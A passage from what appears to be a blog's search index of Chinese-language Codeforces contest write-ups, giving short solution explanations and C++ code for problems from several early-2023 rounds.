= 0; i &lt; n; i++) { if (sccno[i] == scc_cnt) { dfs(i); break; } } return all_of(vis.begin(), vis.end(), [](bool x) { return x == true; }); }; while (l &lt; r) { int mid = (l + r) / 2; if (ok(mid)) { r = mid; } else { l = mid + 1; } } cout &lt;&lt; (l == 1e9 + 10 ? -1 : l) &lt;&lt; &quot;\\n&quot;; } return 0;}","link":"/2023/01/22/CF-1777/"},{"title":"Codeforces Round #846 (Div. 2)【A - D】","text":"unrated 了…… 比赛链接：https://codeforces.com/contest/1780 A. Hayato and School 题解 特判两种答案不存在的情况。 代码 1234567891011121314151617181920212223242526272829303132333435#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;int&gt; odd, even; for (int i = 0; i &lt; n; i++) { int x; cin &gt;&gt; x; (x &amp; 1 ? odd : even).push_back(i); } if (odd.empty() or (odd.size() == 2 and even.size() == 1)) { cout &lt;&lt; &quot;NO&quot; &lt;&lt; &quot;\\n&quot;; } else { cout &lt;&lt; &quot;YES&quot; &lt;&lt; &quot;\\n&quot;; if (odd.size() &gt;= 3) { cout &lt;&lt; odd[0] + 1 &lt;&lt; ' ' &lt;&lt; odd[1] + 1 &lt;&lt; ' ' &lt;&lt; odd[2] + 1 &lt;&lt; &quot;\\n&quot;; } else if (even.size() &gt;= 2) { cout &lt;&lt; odd[0] + 1 &lt;&lt; ' ' &lt;&lt; even[0] + 1 &lt;&lt; ' ' &lt;&lt; even[1] + 1 &lt;&lt; &quot;\\n&quot;; } } } return 0;} B. GCD Partition 题解 合并相邻的两段不改变 gcd，所以只考虑分两段的情况即可。 代码 12345678910111213141516171819202122232425262728293031#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;int&gt; a(n); long long sum = 0; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; sum += a[i]; } long long ans = 0, cur = 0; for (int i = 0; i &lt; n - 1; i++) { cur += a[i]; ans = max(ans, gcd(cur, sum - cur)); } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } return 0;} C. Bon appetit! 题解 贪心的做法可以试下这两组测试样例： 9 3 1 1 1 1 1 2 2 2 2 4 3 2 9 4 1 1 1 1 1 2 2 2 2 3 2 2 2 分别对应 lower_bound 桌子容量和某道菜喜欢人数的情况。 D. Bit Guessing Game 题解 逐位确定，减去一位后有三种情况： 总位数减一，说明该位为 1 总位数不变，说明该位和前一位为 10 总位数加一，说明该位和前两位为 100 …… 代码 12345678910111213141516171819202122232425262728293031323334#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int cnt; cin &gt;&gt; cnt; int n = cnt; int ans = 0; auto ask = [](int i) { cout &lt;&lt; &quot;- &quot; &lt;&lt; (1 &lt;&lt; i) &lt;&lt; endl; int x; cin &gt;&gt; x; return x; }; for (int time = 0, i = 0; time &lt; cnt; time++) { int m = ask(i); ans |= (1 &lt;&lt; (i + m - (n - 1))); i += m - (n - 1) + 1; n = m; } cout &lt;&lt; &quot;! &quot; &lt;&lt; ans &lt;&lt; endl; } return 0;}","link":"/2023/01/26/CF-1780/"},{"title":"Codeforces Round #844 (Div. 1 + Div. 2, based on VK Cup 2022 - Elimination Round)【A - E】","text":"D 题想了半天怎么直接枚举 xxx ，赛后发现是需要通过枚举两数之差的因子来间接确定 xxx 。 E 题这种利用 map 进行区间删减合并的操作也很妙啊…… 比赛链接：https://codeforces.com/contest/1782 A. Parallel Projection 题解 取四个方向的最小值。 代码 123456789101112131415161718192021222324252627#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int w, d, h; cin &gt;&gt; w &gt;&gt; d &gt;&gt; h; int x1, y1, x2, y2; cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2; cout &lt;&lt; h + min({ y1 + y2 + abs(x1 - x2), (d - y1) + (d - y2) + abs(x1 - x2), x1 + x2 + abs(y1 - y2), (w - x1) + (w - x2) + abs(y1 - y2)} ) &lt;&lt; &quot;\\n&quot;; } return 0;} B. Going to the Cinema 题解 枚举去影院的人的个数。 如果去了 iii 个人，那么第 iii 小的人要求的人数应小于 iii ，第 i+1i + 1i+1 小的人要求的人数应大于 iii 。 特判去了 000 和 nnn 人的情况。 代码 12345678910111213141516171819202122232425262728293031#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;int&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } sort(a.begin(), a.end()); int ans = (a[0] &gt; 0) + 1; for (int i = 1; i &lt; n; i++) { if (a[i - 1] &lt;= i - 1 and a[i] &gt; i) { ans += 1; } } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } return 0;} C. Equal Frequencies 题解 枚举最后剩下的字符的种类数。 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; string s; cin &gt;&gt; s; vector&lt;vector&lt;int&gt;&gt; pos(26); vector&lt;int&gt; cnt(26); for (int i = 0; i &lt; n; i++) { pos[s[i] - 'a'].push_back(i); cnt[s[i] - 'a'] += 1; } int ans = INT_MAX; string ans_str; for (int ch_num = 1; ch_num &lt;= 26; ch_num++) { if (n % ch_num != 0) { continue; } int res = 0; string str = s; vector&lt;pair&lt;int, int&gt;&gt; v; for (int i = 0; i &lt; 26; i++) { v.push_back({cnt[i], i}); } sort(v.begin(), v.end(), greater()); vector&lt;int&gt; add; while ((int)v.size() &gt; ch_num) { add.insert(add.end(), v.back().first, v.back().second); v.pop_back(); } vector&lt;int&gt; p(26); for (auto [x, y] : v) { if (x &gt; n / ch_num) { add.insert(add.end(), x - n / ch_num, y); } else { for (int i = 0; i &lt; n / ch_num - x; i++) { str[pos[add.back()][p[add.back()]]] = char('a' + y); p[add.back()] += 1; add.pop_back(); res += 1; } } } if (res &lt; ans) { ans = res; ans_str = str; } } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot; &lt;&lt; ans_str &lt;&lt; &quot;\\n&quot;; } return 0;} D. Many Perfect Squares 题解 两个数可以确定一个 xxx ，设 i&lt;ji \\lt ji&lt;j ，则有： ai+x=s12a_i + x = s_1^2ai​+x=s12​ aj+x=s22a_j + x = s_2^2aj​+x=s22​ aj−ai=s22−s12a_j - a_i = s_2^2 - s_1^2aj​−ai​=s22​−s12​ aj−ai=(s2−s1)(s2+s1)a_j - a_i = (s_2 - s_1)(s_2 + s_1)aj​−ai​=(s2​−s1​)(s2​+s1​) 枚举 i,ji, ji,j 及对应的 s2−s1s_2 - s_1s2​−s1​ ，解出对应的 xxx 。 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); #define int long long int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;int&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } set&lt;int&gt; st; st.insert(0); for (int i = 0; i &lt; n; i++) { for (int j = i + 1; j &lt; n; j++) { for (int k = 1; k * k &lt;= abs(a[j] - a[i]); k++) { if (abs(a[j] - a[i]) % k == 0) { int s2 = (k + abs(a[j] - a[i]) / k) / 2; int s1 = -(k - s2); if (s1 * s1 - a[i] != s2 * s2 - a[j]) { continue; } int x = s2 * s2 - max(a[i], a[j]); if (x &gt;= 0) { st.insert(x); } } } } } int ans = 1; for (auto x : st) { int res = 0; auto b = a; for (int i = 0; i &lt; n; i++) { b[i] += x; int sqr = sqrt(b[i]); if (sqr * sqr == b[i]) { res += 1; } } ans = max(ans, res); } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } return 0;} E. Rectangle Shrinking 题解 计算宽度为 1 的矩形的覆盖面积，先删减宽度为 2 的矩形。 对于一个宽度为 2 的矩形： 如果上下两行都被宽为 1 的矩形覆盖，则删除 如果上下两行有一行被宽为 1 的矩形覆盖，则缩减掉被覆盖的那一行 如果上下两行都未被宽为 1 的矩形覆盖，则对这些矩形进行删减合并 之后将删减完成，宽度为 2 的矩形看作两个宽度为 1 的矩形，再对宽度为 1 的矩形进行删减合并。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;int&gt; u(n), l(n), d(n), r(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; u[i] &gt;&gt; l[i] &gt;&gt; d[i] &gt;&gt; r[i]; } vector&lt;int&gt; p(n); iota(p.begin(), p.end(), 0); sort(p.begin(), p.end(), [&amp;](int x, int y) { return l[x] &lt; l[y]; }); map&lt;int, int&gt; f[2]; for (auto i : p) { if (d[i] - u[i] == 1) { continue; } int x = u[i] - 1; if (not f[x].empty() and f[x].rbegin()-&gt;second &gt;= l[i] - 1) { f[x].rbegin()-&gt;second = max(f[x].rbegin()-&gt;second, r[i]); } else { f[x][l[i]] = r[i]; } } map&lt;int, int&gt; g[2]; for (auto i : p) { if (d[i] - u[i] == 0) { continue; } vector&lt;bool&gt; cv(2); for (int x = 0; x &lt; 2; x++) { auto it = f[x].upper_bound(l[i]); if (it != f[x].begin() and prev(it)-&gt;second &gt;= r[i]) { cv[x] = true; } } if (cv[0] and cv[1]) { u[i] = l[i] = d[i] = r[i] = 0; continue; } if (not cv[0] and not cv[1]) { if (not g[0].empty() and g[0].rbegin()-&gt;second &gt;= r[i]) { u[i] = l[i] = d[i] = r[i] = 0; } else if (not g[0].empty() and g[0].rbegin()-&gt;second &gt;= l[i] - 1) { l[i] = g[0].rbegin()-&gt;second + 1; g[0].rbegin()-&gt;second = r[i]; } else { g[0][l[i]] = r[i]; } continue; } if (cv[0]) { u[i] = 2; } else { d[i] = 1; } } g[1] = g[0]; for (auto i : p) { if (u[i] == 0 or d[i] - u[i] == 1) { continue; } int x = u[i] - 1; auto it = g[x].upper_bound(l[i]); if (it != g[x].end()) { r[i] = min(r[i], it-&gt;first - 1); } if (it != g[x].begin() and prev(it)-&gt;second &gt;= r[i]) { u[i] = l[i] = d[i] = r[i] = 0; } else if (it != g[x].begin() and prev(it)-&gt;second &gt;= l[i] - 1) { l[i] = prev(it)-&gt;second + 1; prev(it)-&gt;second = r[i]; } else { g[x][l[i]] = r[i]; } } int ans = 0; for (int x = 0; x &lt; 2; x++) { for (auto [l, r] : g[x]) { ans += r - l + 1; } } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; for (int i = 0; i &lt; n; i++) { cout &lt;&lt; u[i] &lt;&lt; ' ' &lt;&lt; l[i] &lt;&lt; ' ' &lt;&lt; d[i] &lt;&lt; ' ' &lt;&lt; r[i] &lt;&lt; &quot;\\n&quot;; } } return 0;}","link":"/2023/01/16/CF-1782/"},{"title":"Educational Codeforces Round 141 (Rated for Div. 2)【A - E】","text":"E 题这种把两个数取上整的大小关系转化为区间覆盖问题的方法真是巧妙啊…… 比赛链接：https://codeforces.com/contest/1783 A. Make it Beautiful 题解 排降序，然后把最小的一个数放前面。 代码 123456789101112131415161718192021222324252627282930313233#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;int&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } sort(a.begin(), a.end(), greater()); if (a[0] == a[n - 1]) { cout &lt;&lt; &quot;NO&quot; &lt;&lt; &quot;\\n&quot;; } else { rotate(a.begin(), prev(a.end()), a.end()); cout &lt;&lt; &quot;YES&quot; &lt;&lt; &quot;\\n&quot;; for (int i = 0; i &lt; n; i++) { cout &lt;&lt; a[i] &lt;&lt; &quot; \\n&quot;[i == n - 1]; } } } return 0;} B. Matrix of Differences 题解 构造 n2,1,n2−1,2,n2−2,3…n^2, 1, n^2 - 1, 2, n^2 - 2, 3\\dotsn2,1,n2−1,2,n2−2,3… ，蛇形填入矩阵即可。 代码 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector a(n, vector&lt;int&gt;(n)); int l = 1, r = n * n, cnt = 0; for (int i = 0; i &lt; n; i++) { if (i &amp; 1) { for (int j = n - 1; j &gt;= 0; j--) { a[i][j] = cnt &amp; 1 ? l++ : r--; cnt++; } } else { for (int j = 0; j &lt; n; j++) { a[i][j] = cnt &amp; 1 ? l++ : r--; cnt++; } } } for (int i = 0; i &lt; n; i++) { for (int j = 0; j &lt; n; j++) { cout &lt;&lt; a[i][j] &lt;&lt; &quot; \\n&quot;[j == n - 1]; } } } return 0;} C. Yet Another Tournament 题解 枚举赢的次数，如果赢了 iii 次，只需考虑是否能赢第 i+1i + 1i+1 个人（这个人已经赢了 iii 次）： 如果能赢，那么第 1∼i+11 \\sim i + 11∼i+1 个人都没我赢得多，答案为 n−in - in−i 如果不能赢，那么只有第 1∼i1 \\sim i1∼i 个人没我赢得多，答案为 n−i+1n - i + 1n−i+1 代码 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n, m; cin &gt;&gt; n &gt;&gt; m; vector&lt;int&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } vector&lt;int&gt; b(a); sort(b.begin(), b.end()); vector&lt;int&gt; pre(n + 1); for (int i = 0; i &lt; n; i++) { pre[i + 1] += pre[i] + b[i]; } int ans = n + 1; for (int i = 1; i &lt;= n; i++) { if (m &gt;= pre[i]) { ans = min(ans, n - i + 1); } if (i &lt; n and m &gt;= pre[i] + max(0, a[i] - b[i - 1])) { ans = min(ans, n - i); } } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } return 0;} D. Different Arrays 题解 设 dp[i][j]dp[i][j]dp[i][j] 为 aia_iai​ 值为 jjj 时有多少种排列，答案即 ∑−∞+∞dp[n−1][j]\\sum \\limits _{-\\infty} ^{+\\infty} dp[n-1][j]−∞∑+∞​dp[n−1][j] 。 当 ai=0a_i = 0ai​=0 时，对 ai+1a_{i + 1}ai+1​ 的值只有一种贡献；因为值可能为负数，所以需要加上一个偏移量。 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;bits/stdc++.h&gt;using namespace std;constexpr int MOD = 998244353;constexpr int M = 300 * 300;int norm(int x) { if (x &lt; 0) { x += MOD; } if (x &gt;= MOD) { x -= MOD; } return x; }template&lt;class T&gt; T binpow(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; }struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(MOD - x)); } Z inv() const { assert(x != 0); return binpow(*this, MOD - 2); } Z &amp;operator*=(const Z &amp;rhs) { x = 1LL * x * rhs.x % MOD; return *this; } Z &amp;operator+=(const Z &amp;rhs) { x = norm(x + rhs.x); return *this; } Z &amp;operator-=(const Z &amp;rhs) { x = norm(x - rhs.x); return *this; } Z &amp;operator/=(const Z &amp;rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res /= rhs; return res; }};int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n; cin &gt;&gt; n; vector&lt;int&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } vector dp(n, vector&lt;Z&gt;(2 * M + 1)); dp[1][a[1] + M] = 1; for (int i = 1; i + 1 &lt; n; i++) { for (int j = 0; j &lt;= 2 * M; j++) { if (dp[i][j].val() == 0) { continue; } dp[i + 1][a[i + 1] + (j - M) + M] += dp[i][j]; if (j - M != 0) { dp[i + 1][a[i + 1] - (j - M) + M] += dp[i][j]; } } } cout &lt;&lt; accumulate(dp[n - 1].begin(), dp[n - 1].end(), Z(0)).val() &lt;&lt; &quot;\\n&quot;; return 0;} E. Game of the Year 题解 第一个人能杀死所有怪兽即： ∀ i∈[1,n],⌈aik⌉≤⌈bik⌉\\forall\\ i \\in [1, n], \\lceil \\frac{a_i}{k} \\rceil \\le \\lceil \\frac{b_i}{k} \\rceil∀ i∈[1,n],⌈kai​​⌉≤⌈kbi​​⌉ 。 当 ai≤bia_i \\le b_iai​≤bi​ 时，上式显然成立 当 ai&gt;bia_i \\gt b_iai​&gt;bi​ 时，上式成立即 [bi,ai)[b_i, a_i)[bi​,ai​) 内不能有 kkk 的倍数 所以，一个 kkk 是否可行即判断它的所有倍数是否被某一个区间覆盖。 利用差分计算所有区间覆盖的数，之后枚举 kkk 的倍数即可。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;int&gt; a(n), b(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } for (int i = 0; i &lt; n; i++) { cin &gt;&gt; b[i];; } vector&lt;int&gt; d(n + 1); for (int i = 0; i &lt; n; i++) { if (a[i] &gt; b[i]) { ++d[b[i]]; --d[a[i]]; } } for (int i = 1; i &lt;= n; i++) { d[i] += d[i - 1]; } vector&lt;int&gt; ans; for (int k = 1; k &lt;= n; k++) { int ok = 1; for (int i = k; i &lt;= n; i += k) { if (d[i]) { ok = 0; break; } } if (ok) ans.push_back(k); } cout &lt;&lt; ans.size() &lt;&lt; &quot;\\n&quot;; for (auto x : ans) { cout &lt;&lt; x &lt;&lt; &quot; \\n&quot;[x == ans.back()]; } } return 0;}","link":"/2023/01/11/CF-1783/"},{"title":"Educational Codeforces Round 142 (Rated for Div. 2)【A - D】","text":"中间两题罚时太多了。 比赛链接：https://codeforces.com/contest/1792 A. GamingForces 题解 贪心，将 1 都用第一种操作删除，其他数都用第二种操作。 代码 12345678910111213141516171819202122232425#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; int one = 0, other = 0; for (int i = 0; i &lt; n; i++) { int x; cin &gt;&gt; x; (x == 1 ? one : other) += 1; } cout &lt;&lt; (one + 1) / 2 + other &lt;&lt; &quot;\\n&quot;; } return 0;} B. Stand-up Comedian 题解 执行第 2 或第 3 种操作总和不变，所以可以先执行第 1 种操作，然后重复执行第 2、3 种操作，直至一种为 0，然后讨论最小情绪值和余下两种操作的大小关系就可以了。 代码 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int a, b, c, d; cin &gt;&gt; a &gt;&gt; b &gt;&gt; c &gt;&gt; d; int ans = 0, min_mood = 0; ans += a; min_mood += a; auto op = [](int&amp; x, int&amp; y) { int mi = min(x, y); x -= mi, y-= mi; return mi; }; if (min_mood &gt; 0) { if (b &gt; c) { swap(b, c); } ans += 2 * op(b, c); } ans += op(min_mood, c); ans += op(min_mood, d); cout &lt;&lt; ans + (max({b, c, d}) &gt; 0) &lt;&lt; &quot;\\n&quot;; } return 0;} C. Min Max Sort 题解 操作次数最多为 ⌊n2⌋\\lfloor \\frac{n}{2} \\rfloor⌊2n​⌋ ，从中间值找有多少数对的相对位置满足排序后的关系，从总操作次数中减去这些可以省下的操作次数即可。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;int&gt; a(n), pos(n + 1); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; pos[a[i]] = i; } int ans = n / 2; int l, r; int val_l, val_r; if (n &amp; 1) { l = r = find(a.begin(), a.end(), (n + 1) / 2) - a.begin(); val_l = (n + 1) / 2 - 1, val_r = (n + 1) / 2 + 1; } else { l = find(a.begin(), a.end(), n / 2) - a.begin(); r = find(a.begin(), a.end(), n / 2 + 1) - a.begin(); val_l = n / 2 - 1, val_r = n / 2 + 2; } if (l &lt;= r) { ans -= (n % 2 == 0); while (pos[val_l] &lt; l and pos[val_r] &gt; r) { l = pos[val_l], r = pos[val_r]; val_l -= 1, val_r += 1; ans -= 1; } } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } return 0;} D. Fixed Prefix Permutations 题解 将值的不连续分布转化为位置的连续分布后进行二分。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n, m; cin &gt;&gt; n &gt;&gt; m; vector a(n, vector&lt;int&gt;(m)), pos(a); for (int i = 0; i &lt; n; i++) { for (int j = 0; j &lt; m; j++) { cin &gt;&gt; a[i][j]; --a[i][j]; pos[i][a[i][j]] = j; } } sort(pos.begin(), pos.end()); for (int i = 0; i &lt; n; i++) { int l = 0, r = m; auto ok = [&amp;](int mid) { vector&lt;int&gt; need(m, -1); for (int j = 0; j &lt; mid; j++) { need[j] = a[i][j]; } auto it = lower_bound(pos.begin(), pos.end(), need); if (it == pos.end()) { return false; } for (int j = 0; j &lt; mid; j++) { if (need[j] != (*it)[j]) { return false; } } return true; }; while (l &lt; r) { int mid = (l + r + 1) / 2; if (ok(mid)) { l = mid; } else { r = mid - 1; } } cout &lt;&lt; l &lt;&lt; &quot; \\n&quot;[i == n - 1]; } } return 0;}","link":"/2023/01/25/CF-1792/"},{"title":"Educational Codeforces Round 144 (Rated for Div. 2)【A - D】","text":"路漫漫啊…… A. Typical Interview Problem 题解 字符串以 lcm(3,5)=15lcm(3, 5) = 15lcm(3,5)=15 个数为周期进行循环，循环节为 FBFFBFFB 。 代码 123456789101112131415161718192021222324252627282930313233#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); string s; for (int i = 1; i &lt;= 50; i++) { if (i % 3 == 0) { s += 'F'; } if (i % 5 == 0) { s += 'B'; } } int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; string str; cin &gt;&gt; str; cout &lt;&lt; (s.find(str) != s.npos ? &quot;YES&quot; : &quot;NO&quot;) &lt;&lt; &quot;\\n&quot;; } return 0;} B. Asterisk-Minor Template 题解 如果首部或尾部字母相同，那么一个 * 即可 否则首部尾部各有一个 * ，为了使 * 的数目较少，至少要有两对字母相同，此时为 *a...a* 的形式： 如果两对字母内相同的字母不与两个字母相邻，那么为 *a*a*a* 的形式，不符合条件 所以两个字母内相同的字母必须与两个字母之一相邻，即为 *aa*a* 或 *a*aa* 的形式，此时可以归为 *aa* 的形式 所以可以发现最少只需要 a* 、 *a 、 *aa* 三种形式的字符串。 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { string a, b; cin &gt;&gt; a &gt;&gt; b; int n = a.size(), m = b.size(); if (a.front() == b.front()) { cout &lt;&lt; &quot;YES&quot; &lt;&lt; &quot;\\n&quot;; cout &lt;&lt; a.front() &lt;&lt; &quot;*&quot; &lt;&lt; &quot;\\n&quot;; continue; } if (a.back() == b.back()) { cout &lt;&lt; &quot;YES&quot; &lt;&lt; &quot;\\n&quot;; cout &lt;&lt; &quot;*&quot; &lt;&lt; a.back() &lt;&lt; &quot;\\n&quot;; continue; } bool ok = false; string ans; for (int i = 0; i + 1 &lt; n; i++) { for (int j = 0; j + 1 &lt; m; j++) { if (a[i] == b[j] and a[i + 1] == b[j + 1]) { ok = true; ans = string(&quot;*&quot;) + a.substr(i, 2) + string(&quot;*&quot;); } } } if (not ok) { cout &lt;&lt; &quot;NO&quot; &lt;&lt; &quot;\\n&quot;; } else { cout &lt;&lt; &quot;YES&quot; &lt;&lt; &quot;\\n&quot;; cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } } return 0;} C. Maximum Set 题解 一些 observation ： 满足条件的集合中，较小的数的质因子幂次是较大的数的子集 最长的集合一定都是某个数乘以 2 的幂次，即 a0⋅20,a0⋅21,a0⋅22,…,a0⋅2ka_0 \\cdot 2^0, a_0 \\cdot 2^1, a_0 \\cdot 2^2, \\dots, a_0 \\cdot 2^ka0​⋅20,a0​⋅21,a0​⋅22,…,a0​⋅2k 首项的最小值 mina0=lmin_{a_0} = lmina0​​=l 所以最大幂次的值 k=⌊log2⌊rl⌋⌋k = \\lfloor log_2\\lfloor \\frac{r}{l} \\rfloor \\rfloork=⌊log2​⌊lr​⌋⌋ ，集合的最大长度为 k+1k + 1k+1 ，同时反推出首项的最大值 maxa0=⌊r2k⌋max_{a_0} = \\lfloor \\frac{r}{2^{k}} \\rfloormaxa0​​=⌊2kr​⌋ ，所以首项不同的集合共有 maxa0−l+1max_{a_0} - l + 1maxa0​​−l+1 个。 注意到一个性质： a0⋅2k⋅2&gt;ra_0 \\cdot 2^k\\cdot 2 \\gt ra0​⋅2k⋅2&gt;r ，即 a0⋅2k−1⋅4&gt;ra_0 \\cdot 2^{k - 1} \\cdot 4 \\gt ra0​⋅2k−1⋅4&gt;r ，所以可能存在 a0⋅2k−1⋅3≤ra_0 \\cdot 2^{k - 1} \\cdot 3 \\le ra0​⋅2k−1⋅3≤r ，即将倒数一些数因子中的一个 222 换为 333 仍可能满足条件，此时末项为 bk=a0⋅2k−1⋅3b_k = a_0 \\cdot 2^{k - 1} \\cdot 3bk​=a0​⋅2k−1⋅3 ，首项的最大值 maxb0=⌊r2k−1⋅3⌋max_{b_0} = \\lfloor \\frac{r}{2^{k - 1} \\cdot 3} \\rfloormaxb0​​=⌊2k−1⋅3r​⌋ ，由于可以将连续倒数 1∼k1 \\sim k1∼k 个数中的因子替换，所以这种类型的集合共有 k⋅(maxb0−l+1)k \\cdot (max_{b_0} - l + 1)k⋅(maxb0​​−l+1) 个。 所以集合的最大长度为 k+1k + 1k+1 ，总数为 (maxa0−l+1)+k⋅(maxb0−l+1)(max_{a_0} - l + 1) + k \\cdot (max_{b_0} - l + 1)(maxa0​​−l+1)+k⋅(maxb0​​−l+1) 。 Tips： maxb0−l+1max_{b_0} - l + 1maxb0​​−l+1 可能小于 000 。 代码 12345678910111213141516171819202122232425#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int l, r; cin &gt;&gt; l &gt;&gt; r; int k = __lg(r / l); int ans = 0; ans += r / (1 &lt;&lt; k) - l + 1; ans += max(0, r / (1 &lt;&lt; (k - 1)) / 3 - l + 1) * k; cout &lt;&lt; k + 1 &lt;&lt; ' ' &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } return 0;} D. Maximum Subarray 题解 先令 ai=ai−xa_i = a_i - xai​=ai​−x ，然后令 x=2xx = 2xx=2x ，此时问题即变为选 kkk 个数加上 xxx 后计算最大连续子段和： 若 x≥0x \\ge 0x≥0 ，那么这 kkk 个数要尽量选满在最大区间内 若 x&lt;0x \\lt 0x&lt;0 ，那么这 kkk 个数要尽量选在两边，远离最大区间 这两种情况可以分别归纳为：先选前 kkk 个，然后将所选区间循环 右移/左移 的情况。 此时问题变为单点修改，区间查询最大连续子段和，用线段树即可。 Tips：当 x&lt;0x \\lt 0x&lt;0 时，也可以令 x=−x,k=n−kx = -x, k = n - kx=−x,k=n−k ，此时只需要循环右移即可。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#include &lt;bits/stdc++.h&gt;using namespace std;const int N = 2e5 + 10;int n, m;int w[N];struct node { int l, r; long long tmax, lmax, rmax, sum;} tr[N * 4];void pushup(node &amp;u, node &amp;l, node &amp;r) { u.sum = l.sum + r.sum; u.lmax = max(l.lmax, l.sum + r.lmax); u.rmax = max(r.rmax, r.sum + l.rmax); u.tmax = max(l.rmax + r.lmax, max(l.tmax, r.tmax));}void pushup(int u) { pushup(tr[u], tr[u &lt;&lt; 1], tr[u &lt;&lt; 1 | 1]);}void build(int u, int l, int r) { if (l == r) tr[u] = {l, r, w[r], w[r], w[r], w[r]}; else { tr[u] = {l, r}; int mid = (l + r) &gt;&gt; 1; build(u 